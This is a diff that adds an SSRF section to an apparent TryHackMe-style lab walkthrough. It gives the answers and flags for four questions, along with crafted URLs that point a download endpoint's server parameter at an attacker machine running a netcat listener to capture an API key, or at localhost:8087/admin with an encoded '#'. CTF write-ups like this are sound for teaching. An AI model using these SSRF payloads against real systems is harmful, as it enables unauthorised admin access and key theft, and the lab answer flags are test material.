@@ -230,3 +230,38 @@ Ans: ***jwt-session***
 - ![image](https://github.com/user-attachments/assets/c1dd18c5-5c06-4194-a392-93a336a1652a)
 
 Ans: ***THM{Dont_take_cookies_from_strangers}***
+
+---
+# 10. Server-Side Request Forgery (SSRF)
+
+**Q1. Explore the website. What is the only host allowed to access the admin area?**
+
+Ans: ***localhost***
+
+---
+**Q2. Check the "Download Resume" button. Where does the server parameter point to?**
+
+- `http://10.10.24.67:8087/download?server=secure-file-storage.com:8087&id=75482342`
+
+Ans: ***secure-file-storage.com***
+
+---
+**Q3. Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?**
+
+- Change the server to your machine's IP and port 80
+- `http://10.10.24.67:8087/download?server=<machine-ip>:<port>&id=75482342`
+- set up `nc` to listen for incoming connection
+
+Ans: ***THM{Hello_Im_just_an_API_key}***
+
+---
+**Q4. Going the Extra Mile: There's a way to use SSRF to gain access to the site's admin area. Can you find it?**
+
+**Note: You won't need this flag to progress in the room. You are expected to do some research in order to achieve your goal.**
+
+- modify the URL to tell the website to request this page `http://localhost:8087/admin` "since we know the admin area is in localhost".
+- the hash sign(#) needed to be encoded in ascill -> `%23` 
+- `http://10.10.97.38:8087/download?server=http://localhost:8087/admin%23&id=75482342`
+
+
+
